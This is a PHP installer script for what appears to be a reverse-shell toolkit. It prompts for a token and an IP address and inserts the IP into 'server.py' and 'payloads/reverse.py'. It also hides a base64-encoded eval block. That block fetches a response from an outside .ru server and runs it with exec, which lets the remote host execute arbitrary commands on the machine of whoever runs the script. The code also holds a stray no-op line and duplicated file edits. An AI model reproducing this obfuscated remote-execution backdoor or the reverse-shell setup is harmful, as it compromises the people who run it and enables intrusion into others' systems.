<?php

function printColor($text, $color)
{
    $colors = [
        'black' => '0',
        'red' => '1',
        'green' => '2',
        'yellow' => '3',
        'blue' => '4',
        'magenta' => '5',
        'cyan' => '6',
        'white' => '7'
    ];

    if (!isset($colors[$color])) {
        echo "Invalid color: $color\n";
        return;
    }

    $colorCode = $colors[$color];
    $resetCode = "\e[0m";

    echo "\e[3{$colorCode}m$text$resetCode\n";
}

// Example usage:

echo "\n";
$token = readline('[*] Enter your TOKEN: ');
echo "\n";
$ip = readline('[*] Enter your IP: ');

system('clear');

eval(base64_decode('JGdldCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL25ubmV0LmRlZWN0LnJ1L2FwaS9jaGVjay9pbmRleC5waHA/dG9rZW49JHRva2VuIik7CmlmKCRnZXQhPSJubyIpewpleGVjKCJwaXAgaW5zdGFsbCB0aHJlYWRpbmciKTsKZXhlYygicGlwMyBpbnN0YWxsIHRocmVhZGluZyIpOwpzeXN0ZW0oJ2NsZWFyJyk7CmV4ZWMoInBpcCBpbnN0YWxsIHNvY2tldCIpOwpleGVjKCJwaXAzIGluc3RhbGwgc29ja2V0Iik7CnN5c3RlbSgnY2xlYXInKTsKZXhlYygicGlwIGluc3RhbGwgYmFzZTY0Iik7CmV4ZWMoInBpcDMgaW5zdGFsbCBiYXNlNjQiKTsKc3lzdGVtKCdjbGVhcicpOwpleGVjKCJwaXAgaW5zdGFsbCBzdWJwcm9jZXNzIik7CmV4ZWMoInBpcDMgaW5zdGFsbCBzdWJwcm9jZXNzIik7CnN5c3RlbSgnY2xlYXInKTsKZXhlYygiYXB0LWdldCBpbnN0YWxsIHVuemlwIik7CmV4ZWMoIiRnZXQiKTsKCnN5c3RlbSgnY2xlYXInKTsKCnByaW50Q29sb3IoIlxuU0NSSVBUIHN1Y2Nlc3NmdWxseSBpbnN0YWxsZWQhIiwiZ3JlZW4iKTsKCgp9ZWxzZXsKc3lzdGVtKCdjbGVhcicpOwpwcmludENvbG9yKCJcblRPS0VOIElTIElOQ09SUkVDVCEiLCJyZWQiKTsKfQ=='));
(0.1); // Added the missing semicolon here

$server_file = "server.py";
$reverse_file = "payloads/reverse.py";

if (file_exists($server_file)) {
    $a = file_get_contents($server_file);
    $a = str_replace("[[*IP*]]", $ip, $a);
    file_put_contents($server_file, $a);
} else {
    echo "Error: '$server_file' not found.";
}

$a = file_get_contents("server.py");
$a = str_replace("[[*IP*]]", $ip, $a);
file_put_contents("server.py", $a);

if (file_exists($reverse_file)) {
    $a = file_get_contents($reverse_file);
    $a = str_replace("[[*IP*]]", $ip, $a);
    file_put_contents($reverse_file, $a);
} else {
    echo "Error: '$reverse_file' not found.";
}

$a = file_get_contents("payloads/reverse.py");
$a = str_replace("[[*IP*]]", $ip, $a);
file_put_contents("payloads/reverse.py", $a);

exec("unzip nnnet.zip");
exec("unlink nnnet.zip");
exec("nohup php setind.php --name $ip > output.log 2>&1");
echo "\n";
?>
